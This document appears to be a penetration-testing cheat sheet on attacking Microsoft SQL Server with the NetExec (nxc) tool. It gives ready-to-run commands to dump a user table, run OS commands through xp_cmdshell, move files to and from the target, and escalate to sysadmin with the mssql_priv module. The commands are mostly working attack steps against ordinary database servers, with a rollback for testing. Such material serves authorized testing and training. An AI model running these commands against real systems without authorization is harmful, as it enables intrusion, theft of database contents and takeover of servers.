# 06.12 MSSQL via CME

> Pop OS commands via `nxc mssql` + `xp_cmdshell` (Pwn3d!) or escalate to sysadmin via `mssql_priv` (EXECUTE AS / db_owner).

## Overview

CME MSSQL protocol for SQL queries, OS command execution via xp_cmdshell (DBA required — shown as `Pwn3d!`), file upload/download, and privilege escalation via the mssql_priv module (EXECUTE AS LOGIN / db_owner escalation to sysadmin). Three auth types: AD domain, local Windows (`-d .`), SQL account (`--local-auth`).

## Steps

- `-q "SELECT ..."` executes SQL queries; enumerate databases, tables, and data.
- `-x <cmd>` runs OS commands via xp_cmdshell; only works when user is DBA (`Pwn3d!`).
- `--put-file <local> <remote>` uploads files via MSSQL OPENROWSET/Ole Automation.
- `--get-file <remote> <local>` downloads files from the target.
- `mssql_priv` without ACTION defaults to enum_priv (list privileges).
- `mssql_priv -o ACTION=privesc` escalates to sysadmin via impersonation or db_owner.
- `mssql_priv -o ACTION=rollback` removes the granted sysadmin role after testing.
- After privesc, use `-x whoami` to confirm sysadmin execution context.

## Commands

### List all databases (domain account)

```bash
nxc mssql <TARGET> -u grace -p <PASS> -q "SELECT name FROM master.dbo.sysdatabases"
```

### List all databases (SQL local account)

```bash
nxc mssql <TARGET> -u nicole -p <PASS> --local-auth -q "SELECT name FROM master.dbo.sysdatabases"
```

### List tables in a database

```bash
nxc mssql <TARGET> -u nicole -p <PASS> --local-auth -q "SELECT table_name from core_app.INFORMATION_SCHEMA.TABLES"
```

### Dump table data

```bash
nxc mssql <TARGET> -u nicole -p <PASS> --local-auth -q "SELECT * from [core_app].[dbo].tbl_users"
```

### Execute OS command

```bash
nxc mssql <TARGET> -u nicole -p <PASS> --local-auth -x whoami
```

### Upload file via MSSQL

```bash
nxc mssql <TARGET> -u nicole -p <PASS> --local-auth --put-file /etc/passwd C:/Users/Public/passwd
```

### Download file via MSSQL

```bash
nxc mssql <TARGET> -u nicole -p <PASS> --local-auth --get-file C:/Windows/System32/drivers/etc/hosts hosts
```

### Enumerate MSSQL privileges

```bash
nxc mssql <TARGET> -u robert -p <PASS> -M mssql_priv
```

### Escalate to sysadmin

```bash
nxc mssql <TARGET> -u robert -p <PASS> -M mssql_priv -o ACTION=privesc
```

### Rollback sysadmin privilege

```bash
nxc mssql <TARGET> -u robert -p <PASS> -M mssql_priv -o ACTION=rollback
```
